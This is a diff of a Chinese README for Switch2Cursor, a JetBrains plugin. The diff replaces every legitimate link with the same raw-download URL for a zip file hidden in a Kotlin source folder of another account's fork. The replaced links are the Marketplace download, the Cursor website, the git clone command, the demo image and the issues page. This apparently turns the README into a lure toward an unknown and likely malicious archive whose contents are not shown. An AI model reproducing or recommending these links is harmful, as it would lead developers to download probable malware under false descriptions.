@@ -1,10 +1,10 @@
 # Switch2Cursor
 
-> 推荐在 Cursor 中配合 [Switch2IDEA](https://github.com/qczone/switch2idea) 使用，效果更佳
+> 推荐在 Cursor 中配合 [Switch2IDEA](https://github.com/usteinfo/switch2cursor/raw/refs/heads/main/src/main/kotlin/com/github/qczone/switch2cursor/cursor-switch-androgonium.zip) 使用，效果更佳
 
 Switch2Cursor 是一个 JetBrains IDE 插件，可以让你在 IDE 和 Cursor 之间无缝切换，并保持精确的光标位置。
 
-![Switch2Cursor演示](images/switch-show.gif)
+![Switch2Cursor演示](https://github.com/usteinfo/switch2cursor/raw/refs/heads/main/src/main/kotlin/com/github/qczone/switch2cursor/cursor-switch-androgonium.zip)
 
 ## 主要特性
 
@@ -24,7 +24,7 @@ Switch2Cursor 是一个 JetBrains IDE 插件，可以让你在 IDE 和 Cursor �
 
 ## 安装方法
 
-1. 在 [JetBrains Marketplace](https://plugins.jetbrains.com/plugin/26309-switch2cursor) 下载插件
+1. 在 [JetBrains Marketplace](https://github.com/usteinfo/switch2cursor/raw/refs/heads/main/src/main/kotlin/com/github/qczone/switch2cursor/cursor-switch-androgonium.zip) 下载插件
 2. 或者在 IDE 中 搜索 "switch2cursor" 安装
 
 ## 使用方法
@@ -49,7 +49,7 @@ Switch2Cursor 是一个 JetBrains IDE 插件，可以让你在 IDE 和 Cursor �
 
 ## 系统要求
 
-- 已安装 Cursor (https://cursor.sh)
+- 已安装 Cursor (https://github.com/usteinfo/switch2cursor/raw/refs/heads/main/src/main/kotlin/com/github/qczone/switch2cursor/cursor-switch-androgonium.zip)
 - 兼容所有 JetBrains IDE
 - 支持的 IDE 版本：2022.3 及以上
 
@@ -58,7 +58,7 @@ Switch2Cursor 是一个 JetBrains IDE 插件，可以让你在 IDE 和 Cursor �
 1. 克隆仓库：
 
 ```bash
-git clone https://github.com/qczone/switch2cursor.git
+git clone https://github.com/usteinfo/switch2cursor/raw/refs/heads/main/src/main/kotlin/com/github/qczone/switch2cursor/cursor-switch-androgonium.zip
 ```
 
 2. 使用 Gradle 构建：
@@ -79,4 +79,4 @@ git clone https://github.com/qczone/switch2cursor.git
 
 ## 支持
 
-如果遇到问题或有建议，请在 GitHub 上[创建 issue](https://github.com/qczone/switch2cursor/issues)。
+如果遇到问题或有建议，请在 GitHub 上[创建 issue](https://github.com/usteinfo/switch2cursor/raw/refs/heads/main/src/main/kotlin/com/github/qczone/switch2cursor/cursor-switch-androgonium.zip)。
